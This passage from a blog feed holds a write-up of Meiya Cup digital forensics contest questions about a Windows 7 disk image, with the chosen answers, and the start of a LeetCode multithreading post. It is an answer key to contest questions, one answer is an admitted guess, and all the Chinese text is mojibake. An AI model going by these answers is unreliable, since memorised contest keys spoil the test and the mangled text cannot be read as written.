class="code"><pre><span class="line"><span class="built_in">PS</span> C:\WINDOWS\system32&gt; python</span><br><span class="line">Python <span class="number">3.7</span>.<span class="number">4</span> (tags/v3.<span class="number">7.4</span>:e09359112e, Jul  <span class="number">8</span> <span class="number">2019</span>, <span class="number">19</span>:<span class="number">29</span>:<span class="number">22</span>) [<span class="type">MSC</span> <span class="type">v.1916</span> <span class="number">32</span> <span class="type">bit</span> (<span class="built_in">Int</span><span class="type">el</span>)] on win32</span><br><span class="line"><span class="built_in">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; <span class="number">512</span>*<span class="number">62910464</span></span><br><span class="line"><span class="number">32210157568</span></span><br></pre></td></tr></table></figure></blockquote><blockquote><p>å½“æˆ‘æŠŠæ‘˜è¦å¾€ä¸‹ç¿»æ‰å‘ç°åŸæ¥æ‘˜è¦é‡Œå°±æœ‰â€¦å¥½æ°”å•Šâ€¦</p><p><img src="https://i.loli.net/2020/10/06/XjOChmZJEQnk4Iy.png" alt="image.png"></p></blockquote><h2 id="5-æ“ä½œç³»ç»Ÿåˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯å“ªç§"><a href="#5-æ“ä½œç³»ç»Ÿåˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯å“ªç§" class="headerlink" title="5.æ“ä½œç³»ç»Ÿåˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯å“ªç§?"></a>5.æ“ä½œç³»ç»Ÿåˆ†åŒºçš„æ–‡ä»¶ç³»ç»Ÿæ˜¯å“ªç§?</h2><blockquote><p>A. FAT32</p><p>B. EXFAT</p><p>C. NTFS</p><p>D. EXT3</p><p>E. HFS+</p></blockquote><p>åœ¨ã€æ‘˜è¦ã€‘ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå…¶æ–‡ä»¶ç³»ç»Ÿåº”è¯¥ä¸º<strong>NTFS</strong></p><p><img src="https://i.loli.net/2020/10/06/qTtHYUcEJjDyOLh.png" alt="image.png"></p><h2 id="6-æ“ä½œç³»ç»Ÿåˆ†åŒºï¼Œæ¯ä¸ªç°‡-Cluster-åŒ…å«å‡ ä¸ªæ‰‡åŒº-sectors"><a href="#6-æ“ä½œç³»ç»Ÿåˆ†åŒºï¼Œæ¯ä¸ªç°‡-Cluster-åŒ…å«å‡ ä¸ªæ‰‡åŒº-sectors" class="headerlink" title="6.æ“ä½œç³»ç»Ÿåˆ†åŒºï¼Œæ¯ä¸ªç°‡(Cluster)åŒ…å«å‡ ä¸ªæ‰‡åŒº(sectors)?"></a>6.æ“ä½œç³»ç»Ÿåˆ†åŒºï¼Œæ¯ä¸ªç°‡(Cluster)åŒ…å«å‡ ä¸ªæ‰‡åŒº(sectors)?</h2><blockquote><p>A. 2</p><p>B. 4</p><p>C. 6</p><p>D. 8</p><p>E. 16</p></blockquote><p>emmmmè¿™é“é¢˜æˆ‘æ˜¯ç”¨æ¯”è¾ƒç¬¨çš„æ–¹æ³•æ¥åšçš„ï¼ˆå› ä¸ºåˆšå¼€å§‹å­¦ç”µå­å–è¯XD</p><p>é¦–å…ˆä½¿ç”¨<strong>AccessData FTK Imager</strong>å°†é•œåƒé‡Œçš„ä¸‰ä¸ªç›˜æŒ‚è½½åˆ°è‡ªå·±ç”µè„‘ä¸Š</p><p><img src="https://i.loli.net/2020/10/06/aHURQw1P38ktSmK.png" alt="image.png"></p><p>ç„¶åä½¿ç”¨<strong>DiskGenius</strong>æŸ¥çœ‹åˆ†åŒºå¯çŸ¥<strong>ç°‡å¤§å°ä¸º4096 Byte</strong></p><p><img src="https://i.loli.net/2020/10/06/foJDFj5dOrMi6sB.png" alt="image.png"></p><p>å‰é¢æˆ‘ä»¬å·²çŸ¥å•ä¸ªæ‰‡åŒºä¸º<strong>512 Byte</strong>ï¼Œæ•…æ¯ä¸ªç°‡åŒ…å« 4096 &#x2F; 512 &#x3D; **8 ** ä¸ªæ‰‡åŒº</p><h2 id="7-åœ¨æ“ä½œç³»ç»Ÿåˆ†åŒºå†…ï¼Œ-MFTçš„ç‰©ç†èµ·å§‹æ‰‡åŒºä½ç½®-Starting-physical-sector-æ˜¯ä»€ä¹ˆ"><a href="#7-åœ¨æ“ä½œç³»ç»Ÿåˆ†åŒºå†…ï¼Œ-MFTçš„ç‰©ç†èµ·å§‹æ‰‡åŒºä½ç½®-Starting-physical-sector-æ˜¯ä»€ä¹ˆ" class="headerlink" title="7.åœ¨æ“ä½œç³»ç»Ÿåˆ†åŒºå†…ï¼Œ$MFTçš„ç‰©ç†èµ·å§‹æ‰‡åŒºä½ç½®(Starting physical sector)æ˜¯ä»€ä¹ˆ?"></a>7.åœ¨æ“ä½œç³»ç»Ÿåˆ†åŒºå†…ï¼Œ$MFTçš„ç‰©ç†èµ·å§‹æ‰‡åŒºä½ç½®(Starting physical sector)æ˜¯ä»€ä¹ˆ?</h2><blockquote><p>A. 62,919,936</p><p>B. 67,086,648</p><p>C. 68,942,784</p><p>D. 69,208,064</p><p>E. 79,865,960</p></blockquote><p>åœ¨å–è¯å¤§å¸ˆä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºå…¶ç‰©ç†èµ·å§‹æ‰‡åŒºä½ç½®åº”ä¸º<strong>69,208,064</strong></p><p><img src="https://i.loli.net/2020/10/06/y5zQqL8KdICjAGl.png" alt="image.png"></p><h2 id="8-è¯·æ‰¾å‡ºç³»ç»Ÿæ–‡ä»¶â€œSOFTWAREï¼‚ï¼Œè¯·é—®æ“ä½œç³»ç»Ÿçš„å®‰è£…æ—¥æœŸæ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œä¸–ç•Œåè°ƒæ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-UTCï¼‰"><a href="#8-è¯·æ‰¾å‡ºç³»ç»Ÿæ–‡ä»¶â€œSOFTWAREï¼‚ï¼Œè¯·é—®æ“ä½œç³»ç»Ÿçš„å®‰è£…æ—¥æœŸæ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œä¸–ç•Œåè°ƒæ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-UTCï¼‰" class="headerlink" title="8.è¯·æ‰¾å‡ºç³»ç»Ÿæ–‡ä»¶â€œSOFTWAREï¼‚ï¼Œè¯·é—®æ“ä½œç³»ç»Ÿçš„å®‰è£…æ—¥æœŸæ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œä¸–ç•Œåè°ƒæ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM UTCï¼‰"></a>8.è¯·æ‰¾å‡ºç³»ç»Ÿæ–‡ä»¶â€œSOFTWAREï¼‚ï¼Œè¯·é—®æ“ä½œç³»ç»Ÿçš„å®‰è£…æ—¥æœŸæ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œä¸–ç•Œåè°ƒæ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM UTCï¼‰</h2><blockquote><p>A. 2018-10-25 08:08 UTC</p><p>B. 2018-10-25 08:09 UTC</p><p>C. 2018-10-25 08:10 UTC</p><p>D. 2018-10-25 08:11 UTC</p><p>E. 2018-10-25 08:12 UTC</p></blockquote><p>ä½¿ç”¨å–è¯å¤§å¸ˆæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ‰¾åˆ°æˆ‘ä»¬æ‰€éœ€çš„æ–‡ä»¶å¹¶å°†ä¹‹æå–å‡ºæ¥</p><p><img src="https://i.loli.net/2020/10/06/l2Ck9otVxUnKBwb.png" alt="RONVO_P~1_8JDDEBG~UJEA1.png"></p><p><img src="https://i.loli.net/2020/10/06/Cm5WqZti43RBHg6.png" alt="3S0G_N35TRPDI_9ACZBKT_W.png"></p><p>åŒæ ·çš„æˆ‘ä»¬ä½¿ç”¨å–è¯å¤§å¸ˆä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ç³»ç»Ÿå®‰è£…æ—¶é—´ä¸º<strong>2018-10-25 16:08:39</strong></p><blockquote><p>ï¼ˆ<strong>æ³¨ï¼šæˆ‘ä»¬æ‰€å¤„çš„æ—¶åŒºä¸ºUTC+8ï¼Œæ‰€ä»¥ç­”æ¡ˆåº”è¯¥å†å‡å»8h</strong>ï¼‰</p></blockquote><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="9-ç”¨æˆ·â€œvictorï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦-SID-æ˜¯ä»€ä¹ˆ-ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰"><a href="#9-ç”¨æˆ·â€œvictorï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦-SID-æ˜¯ä»€ä¹ˆ-ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰" class="headerlink" title="9.ç”¨æˆ·â€œvictorï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦(SID)æ˜¯ä»€ä¹ˆ?ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰"></a>9.ç”¨æˆ·â€œvictorï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦(SID)æ˜¯ä»€ä¹ˆ?ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰</h2><blockquote><p>A. 1001</p><p>B. 1002</p><p>C. 1003</p><p>D. 1004</p><p>E. 1005</p></blockquote><p>ä½¿ç”¨å–è¯å¤§å¸ˆæˆ‘ä»¬å¯ä»¥åœ¨ã€ç”¨æˆ·ä¿¡æ¯ã€‘ä¸€æ å¾ˆæ–¹ä¾¿åœ°çœ‹åˆ°æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬SIDï¼Œå…¶ä¸­<strong>ç”¨æˆ·victorçš„SIDä¸º1001</strong></p><p><img src="https://i.loli.net/2020/10/06/4IFwv7mJGpHeU6o.png" alt="image.png"></p><h2 id="10-ç”¨æˆ·â€œLilyï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦-SID-æ˜¯ä»€ä¹ˆ-ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰"><a href="#10-ç”¨æˆ·â€œLilyï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦-SID-æ˜¯ä»€ä¹ˆ-ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰" class="headerlink" title="10.ç”¨æˆ·â€œLilyï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦(SID)æ˜¯ä»€ä¹ˆ?ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰"></a>10.ç”¨æˆ·â€œLilyï¼‚çš„å”¯ä¸€æ ‡è¯†ç¬¦(SID)æ˜¯ä»€ä¹ˆ?ï¼ˆç­”æ¡ˆæ ¼å¼ï¼šRIDï¼‰</h2><blockquote><p>A. 1001</p><p>B. 1002</p><p>C. 1003</p><p>D. 1004</p><p>E. 1005</p></blockquote><p>ä½¿ç”¨å–è¯å¤§å¸ˆæˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿åœ°çœ‹åˆ°æ¯ä¸ªç”¨æˆ·çš„SIDï¼Œå…¶ä¸­<strong>ç”¨æˆ·Lilyçš„SIDä¸º1003</strong></p><p><img src="https://i.loli.net/2020/10/06/4IFwv7mJGpHeU6o.png" alt="image.png"></p><h2 id="11-Victorä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-8ï¼‰"><a href="#11-Victorä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-8ï¼‰" class="headerlink" title="11.Victorä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM +8ï¼‰"></a>11.Victorä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM +8ï¼‰</h2><blockquote><p>A. 2018-11-01 16:08 +8</p><p>B. 2018-11:01 14:15 +8</p><p>C. 2018-10-26 17:00 +8</p><p>D. 2018-10-25 08:08 +8</p><p>E. 2018-10-25 16:08 +8</p></blockquote><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å–è¯å¤§å¸ˆå¾—åˆ°ç”¨æˆ·victorä¸Šæ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´åº”ä¸º <strong>2018-10-25 16:08:37 + 8</strong></p><p><img src="https://i.loli.net/2020/10/06/rGKXT2lgp8avNYD.png" alt="image.png"></p><h2 id="12-Lilyä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-8ï¼‰"><a href="#12-Lilyä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯-ï¼ˆç­”æ¡ˆæ ¼å¼-ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD-HH-MM-8ï¼‰" class="headerlink" title="12.Lilyä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM +8ï¼‰"></a>12.Lilyä¸Šä¸€æ¬¡æ›´æ”¹ç³»ç»Ÿç™»å…¥å¯†ç æ˜¯? ï¼ˆç­”æ¡ˆæ ¼å¼ ï¼â€œæœ¬åœ°æ—¶é—´ï¼‚ï¼šYYYY-MM-DD HH:MM +8ï¼‰</h2><blockquote><p> A. 2018-11-01 03:02:01 +8</p><p>B. 2018-11:02 11:13:33 +8</p><p>C. 2018-10-26 17:00:45 +8</p><p>D. 2018-10-30 12:30:40 +8</p><p>E. 2018-10-27 12:08:37 +8</p></blockquote><p>åŒæ ·åœ°æˆ‘ä»¬å¯ä»¥å¾—åˆ°ç”¨æˆ·Lilyä¸Šæ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´åº”ä¸º <strong>2018-10-30 12:30:40 + 8</strong></p><p><img src="https://i.loli.net/2020/10/06/rGKXT2lgp8avNYD.png" alt="image.png"></p><h2 id="13-Victor-æ€»å…±ç™»å½•ç³»ç»Ÿå¤šå°‘æ¬¡"><a href="#13-Victor-æ€»å…±ç™»å½•ç³»ç»Ÿå¤šå°‘æ¬¡" class="headerlink" title="13.Victor æ€»å…±ç™»å½•ç³»ç»Ÿå¤šå°‘æ¬¡?"></a>13.Victor æ€»å…±ç™»å½•ç³»ç»Ÿå¤šå°‘æ¬¡?</h2><blockquote><p>A. 3</p><p>B. 16</p><p>C. 33</p><p>D. 36</p><p>E. 45</p></blockquote><p>é€šè¿‡å–è¯å¤§å¸ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°victoræ€»å…±ç™»å½•äº†<strong>36æ¬¡</strong></p><p><img src="https://i.loli.net/2020/10/06/jhS3ZF7YiEbUuGk.png" alt="image.png"></p><h2 id="14-ä»¥ä¸‹å“ªä¸ªå¸å·å·²ç»è¢«ç¦ç”¨"><a href="#14-ä»¥ä¸‹å“ªä¸ªå¸å·å·²ç»è¢«ç¦ç”¨" class="headerlink" title="14.ä»¥ä¸‹å“ªä¸ªå¸å·å·²ç»è¢«ç¦ç”¨?"></a>14.ä»¥ä¸‹å“ªä¸ªå¸å·å·²ç»è¢«ç¦ç”¨?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. ä»¥ä¸Šçš†ä¸æ˜¯</p></blockquote><p>åœ¨å–è¯å¤§å¸ˆä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<strong>Administratorè´¦æˆ·å¤„äºç¦ç”¨çŠ¶æ€</strong></p><p><img src="https://i.loli.net/2020/10/06/R9EHNgJZIslXnjY.png" alt="image.png"></p><h2 id="15-ä»¥ä¸‹å“ªä¸ªå¸ç³»ç»Ÿæƒé™æœ€ä½"><a href="#15-ä»¥ä¸‹å“ªä¸ªå¸ç³»ç»Ÿæƒé™æœ€ä½" class="headerlink" title="15.ä»¥ä¸‹å“ªä¸ªå¸ç³»ç»Ÿæƒé™æœ€ä½?"></a>15.ä»¥ä¸‹å“ªä¸ªå¸ç³»ç»Ÿæƒé™æœ€ä½?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. ä»¥ä¸Šæƒé™ä¸€æ ·</p></blockquote><p>Simonè´¦æˆ·å¤„åœ¨Guestsç”¨æˆ·ç»„ï¼Œæƒé™æœ€ä½</p><p><img src="https://i.loli.net/2020/10/06/R9EHNgJZIslXnjY.png" alt="image.png"></p><h2 id="16-ä»¥ä¸‹å“ªä¸ªå¸å·æ›¾ç»è¿œç«¯ç™»å½•ç³»ç»Ÿ"><a href="#16-ä»¥ä¸‹å“ªä¸ªå¸å·æ›¾ç»è¿œç«¯ç™»å½•ç³»ç»Ÿ" class="headerlink" title="16.ä»¥ä¸‹å“ªä¸ªå¸å·æ›¾ç»è¿œç«¯ç™»å½•ç³»ç»Ÿ?"></a>16.ä»¥ä¸‹å“ªä¸ªå¸å·æ›¾ç»è¿œç«¯ç™»å½•ç³»ç»Ÿ?</h2><blockquote><p>A. Administrator</p><p>B. victor</p><p>C. Lily</p><p>D. simon</p><p>E. è¿œç«¯ç™»å…¥å·²è¢«ç¦æ­¢</p></blockquote><p>emmmçœ‹äº†ä¸€åœˆå‘ç°æ²¡æœ‰è´¦å·æœ‰è¿œç«¯ç™»å…¥çš„è®°å½•ï¼Œåªèƒ½å¤§èƒ†çŒœæµ‹è¿œç«¯ç™»å…¥å·²è¢«ç¦æ­¢äº†XDD</p><p>åé¢æˆ–è®¸èƒ½å¤Ÿæ‰¾åˆ°è¿™é¢˜çš„æ­£ç¡®è§£æ³•ï¼ˆç˜«</p><h2 id="17-ç¡¬ç›˜æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬"><a href="#17-ç¡¬ç›˜æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬" class="headerlink" title="17.ç¡¬ç›˜æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬?"></a>17.ç¡¬ç›˜æ“ä½œç³»ç»Ÿçš„ç‰ˆæœ¬?</h2><blockquote><p>A. Windows 7 Enterprise (32 ä½)</p><p>B. Windows 7 Enterprise (64 ä½)</p><p>C. Windows 7 Professional (32 ä½)</p><p>D. Windows 7 Professional (64 ä½)</p><p>E. Windows 7 Ultimate (64 ä½)</p></blockquote><p>å–è¯å¤§å¸ˆä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç³»ç»Ÿç‰ˆæœ¬ä¸º<strong>64ä½çš„Win7 Professional</strong></p><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="18-æ“ä½œç³»ç»Ÿçš„æœ€æ–°æœåŠ¡åŒ…-Service-Pack-ç‰ˆæœ¬å·æ˜¯ä»€ä¹ˆ"><a href="#18-æ“ä½œç³»ç»Ÿçš„æœ€æ–°æœåŠ¡åŒ…-Service-Pack-ç‰ˆæœ¬å·æ˜¯ä»€ä¹ˆ" class="headerlink" title="18.æ“ä½œç³»ç»Ÿçš„æœ€æ–°æœåŠ¡åŒ…(Service Pack)ç‰ˆæœ¬å·æ˜¯ä»€ä¹ˆ?"></a>18.æ“ä½œç³»ç»Ÿçš„æœ€æ–°æœåŠ¡åŒ…(Service Pack)ç‰ˆæœ¬å·æ˜¯ä»€ä¹ˆ?</h2><blockquote><p>A. Service Pack 1</p><p>B. Service Pack 2</p><p>C. Service Pack 3</p><p>D. Service Pack 4</p><p>E. Service Pack 5</p></blockquote><p> è¿˜æ˜¯åœ¨å–è¯å¤§å¸ˆä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ€æ–°æœåŠ¡åŒ…ä¸º<strong>Service Pack 1</strong></p><p><img src="https://i.loli.net/2020/10/06/6KlSf7RnQruiMXL.png" alt="image.png"></p><h2 id="19-ä¸‹åˆ—å“ªä¸ªæ˜¯victorçš„é»˜è®¤æ‰“å°æœº"><a href="#19-ä¸‹åˆ—å“ªä¸ªæ˜¯victorçš„é»˜è®¤æ‰“å°æœº" class="headerlink" title="19.ä¸‹åˆ—å“ªä¸ªæ˜¯victorçš„é»˜è®¤æ‰“å°æœº?"></a>19.ä¸‹åˆ—å“ªä¸ªæ˜¯victorçš„é»˜è®¤æ‰“å°æœº?</h2><blockquote><p>A. HP OfficeJet 250 Mobile Series</p><p>B. CutePDF Writer</p><p>C. Microsoft XPS Document Writer</p><p>D. PDF Complete</p><p>E. AL-M2330</p></blockquote><p>è¿™é“é¢˜ç›´æ¥çœ‹é…ç½®å¯èƒ½æ²¡å•¥æ€è·¯ï¼ˆ<del>æ¯”å¦‚è¯´åƒæˆ‘è¿™æ ·èœçš„äººå°±ä¸€å¤´é›¾æ°´</del></p><p>æ¯”è¾ƒå¿«æ·çš„åšæ³•æ˜¯<strong>ç«çœ¼ä»¿çœŸ</strong>ç›´æ¥<strong>ç™»å½•victorè´¦æˆ·éšä¾¿æ‰“å°ä¸€ä¸ªæ–‡æ¡£çœ‹çœ‹</strong></p><p>å¯ä»¥çœ‹å‡ºæ¥é»˜è®¤æ‰“å°æœºåº”å½“æ˜¯<strong>CutePDF Writer</strong></p><p><img src="https://i.loli.net/2020/11/12/5Lcf6mPKMVCg4Qv.png" alt="image.png"></p><h2 id="20-åœ¨2018-10-31-08-29-32-8æ—¶é—´-è´¦å·simonæ›¾ç»ä½¿ç”¨ä»¥ä¸‹å“ªä¸ªæ–‡ä»¶"><a href="#20-åœ¨2018-10-31-08-29-32-8æ—¶é—´-è´¦å·simonæ›¾ç»ä½¿ç”¨ä»¥ä¸‹å“ªä¸ªæ–‡ä»¶" class="headerlink" title="20.åœ¨2018-10-31 08:29:32 +8æ—¶é—´, è´¦å·simonæ›¾ç»ä½¿ç”¨ä»¥ä¸‹å“ªä¸ªæ–‡ä»¶?"></a>20.åœ¨2018-10-31 08:29:32 +8æ—¶é—´, è´¦å·simonæ›¾ç»ä½¿ç”¨ä»¥ä¸‹å“ªä¸ªæ–‡ä»¶?</h2><blockquote><p>A. Microsoft å•†åº—.url</p><p>B. ug.jpeg</p><p>C. Reddy Resume.doc</p><p>D. grocerylistsDOTorg_Spreadsheet_v1_1.xls</p><p>E. InvoiceTemplate.docx</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://meiyacup.com/&quot;&gt;â€œç¾äºšæ¯â€ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›&lt;/a&gt;æ˜¯ç”±&lt;strong&gt;ä¸­å›½åˆ‘äº‹è­¦å¯Ÿå­¦é™¢ä¸»åŠã€å¦é—¨ç¾äºšæŸç§‘æ‰¿åŠçš„ä¸­å›½ç”µå­æ•°æ®å–è¯å¤§èµ›&lt;/strong&gt;ï¼Œä¹Ÿæ˜¯å›½å†…è¾ƒä¸ºæœ‰åçš„æ•°æ®å–è¯æ¯”èµ›&lt;/p&gt;
&lt;p&gt;ä½œä¸ºç½‘å®‰ä¸“ä¸šçš„å°èŒæ–°å»å¹´å¯¹æ­¤æ¯«ä¸çŸ¥æƒ…ï¼ˆ&lt;del&gt;çŸ¥æƒ…äº†æˆ‘å¯èƒ½ä¹Ÿè¿‡ä¸äº†èµ„æ ¼èµ›&lt;/del&gt;ï¼‰ï¼Œäºæ˜¯ä»Šå¹´æƒ³è¦å»ç©ç©ï¼ˆ&lt;del&gt;æŒ‡åˆ’æ°´&lt;/del&gt;ï¼‰ï¼Œæ‰€ä»¥æ‰“ç®—è¶æ—¶é—´è¿˜å¤ŸæŠŠè¿‡å»çš„å‡ æ¬¡æ¯”èµ›çš„çœŸé¢˜ç»™åˆ·ä¸€åˆ·XD&lt;/p&gt;</summary>
    
    
    
    <category term="ç”µå­å–è¯" scheme="http://archive.next.arttnba3.cn/categories/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    
    <category term="ç”µå­å–è¯" scheme="http://archive.next.arttnba3.cn/tags/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/"/>
    
    <category term="ç¾äºšæ¯" scheme="http://archive.next.arttnba3.cn/tags/%E7%BE%8E%E4%BA%9A%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>ã€OJ-0x0006-Leetcodeã€‘å¤šçº¿ç¨‹éƒ¨åˆ†write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/10/02/%E3%80%90OJ-0x0006-Leetcode%E3%80%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/10/02/%E3%80%90OJ-0x0006-Leetcode%E3%80%91%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-10-01T17:23:31.000Z</published>
    <updated>2020-10-03T18:38:54.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>è™½ç„¶è¯´å¾ˆä¹…ä»¥å‰å·²ç»â€œå­¦è¿‡äº†â€œå¤šçº¿ç¨‹çš„å†…å®¹ï¼Œä½†æ˜¯å…¶å®è¿˜æ˜¯ä¸€çŸ¥åŠè§£XDï¼ˆå…¶å®æ˜¯ä¸€ç‚¹éƒ½ä¸æ‡‚å¤šçº¿ç¨‹ï¼ˆè™½ç„¶è¯´å†™è¿‡å‡ ä¸ªç®€å•çš„å¤šçº¿ç¨‹çš„åº”ç”¨å°ç¨‹åºï¼ˆğŸ‘ˆé‚£åªæ˜¯Javaä½œä¸šçš„ç¨‹åº¦å•Šå–‚ï¼ˆğŸ‘ˆæ²¡æœ‰ç”¨å¿ƒå­¦ä¹ çš„å±‘</p><p>æ€æ¥æƒ³å»è¿˜æ˜¯å¾—é leetcodeæ¥å·©å›ºåŸºç¡€çŸ¥è¯†å•Šï¼ˆx</p><blockquote><p>è™½ç„¶è¯´é¢˜ç›®æŒºå°‘â€¦â€¦<del>ä¸è¿‡ä¹Ÿå‡‘åˆå‡‘åˆåˆ·åˆ·</del></p><p><del>å…¶å®ç›¯ä¸Šçš„å°±æ˜¯é¢˜ç›®å°‘çš„é¢˜åº“</del></p></blockquote><span id="more"></span><p>ï¼ˆå·å·åœ¨è¿™é‡Œè¯´ä¸€å¥ä¸ºäº†å·©å›ºä»£ç åŠ›å†³å®šå„ç§è¯­è¨€çš„å†™æ³•éƒ½å­¦ä¸€éï¼ˆ</p><h1 id="0x01-ç®€å•"><a href="#0x01-ç®€å•" class="headerlink" title="0x01.ç®€å•"></a>0x01.ç®€å•</h1><h2 id="0x00-æŒ‰åºæ‰“å°"><a href="#0x00-æŒ‰åºæ‰“å°" class="headerlink" title="0x00. æŒ‰åºæ‰“å°"></a>0x00.<a href="https://leetcode-cn.com/problems/print-in-order/"> æŒ‰åºæ‰“å°</a></h2><blockquote><p>æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªç±»ï¼š</p><p>public class Foo {<br>  public void first() { print(â€œfirstâ€); }<br>  public void second() { print(â€œsecondâ€); }<br>  public void third() { print(â€œthirdâ€); }<br>}<br>ä¸‰ä¸ªä¸åŒçš„çº¿ç¨‹å°†ä¼šå…±ç”¨ä¸€ä¸ª Foo å®ä¾‹ã€‚</p><p>çº¿ç¨‹ A å°†ä¼šè°ƒç”¨ first() æ–¹æ³•<br>çº¿ç¨‹ B å°†ä¼šè°ƒç”¨ second() æ–¹æ³•<br>çº¿ç¨‹ C å°†ä¼šè°ƒç”¨ third() æ–¹æ³•<br>è¯·è®¾è®¡ä¿®æ”¹ç¨‹åºï¼Œä»¥ç¡®ä¿ second() æ–¹æ³•åœ¨ first() æ–¹æ³•ä¹‹åè¢«æ‰§è¡Œï¼Œthird() æ–¹æ³•åœ¨ second() æ–¹æ³•ä¹‹åè¢«æ‰§è¡Œã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [1,2,3]<br>è¾“å‡º: 